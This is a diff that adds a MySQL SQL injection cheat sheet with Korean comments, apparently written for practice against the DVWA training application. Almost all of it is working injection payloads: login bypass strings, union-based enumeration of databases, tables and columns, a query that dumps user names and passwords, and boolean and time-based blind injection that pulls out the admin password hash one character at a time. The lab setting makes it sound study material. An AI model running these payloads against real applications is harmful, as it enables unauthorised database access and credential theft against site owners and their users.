@@ -1,0 +1,51 @@
+************************** DB : mysql **************************
+
+// Where 구문 우회
+' or '1'='1
+' or '1'='1'#
+
+// union select 구문을 이용하여 컬럼 개수 알아내기
+' union select 1,1#
+
+// order by 구문을 이용하여 컬럼 개수 알아내기
+' order by 2#
+
+// 데이터베이스 명 조회
+' union select schema_name,1 from information_schema.schemata #
+
+// 현재 데이터베이스 명 확인(에러로 확인)
+1' and aaa()<1#
+
+// 데이터베이스 테이블 명 조회
+' union select table_schema,table_name from information_schema.tables#
+
+// dvwa 데이터베이스 테이블 명 조회
+' union select table_schema,table_name from information_schema.tables where table_schema='dvwa'#
+
+// users 테이블 컬럼 조회
+' union select table_name, column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
+
+// users 테이블 user 이름과 password 확인
+' union select user,password from users #
+
+// 블라인드 SQL 인젝션 참 구문
+1' and 1=1#
+1' and '1'='1
+1' and '1'='1'#
+
+// 블라인드 SQL 인젝션 거짓 구문
+1' and 1=2#
+1' and '1'='2
+1' and '1'='2'#
+
+// 시간기반 블라인드 SQL 인젝션 탐지 구문을
+1' and sleep(5)#
+
+// 블라인드 SQL 인젝션을 통한 admin 비밀번호 길이 추출
+' or user='admin' and length(password) = 32#
+
+// 블라인드 SQL 인젝션을 통해 admin 비밀번호 추출
+' or user='admin' and ascii(substr(password,1,1))=53#
+' or user='admin' and ascii(substr(password,2,1))=102#
+...
+' or user='admin' and ascii(substr(password,32,1))=57#
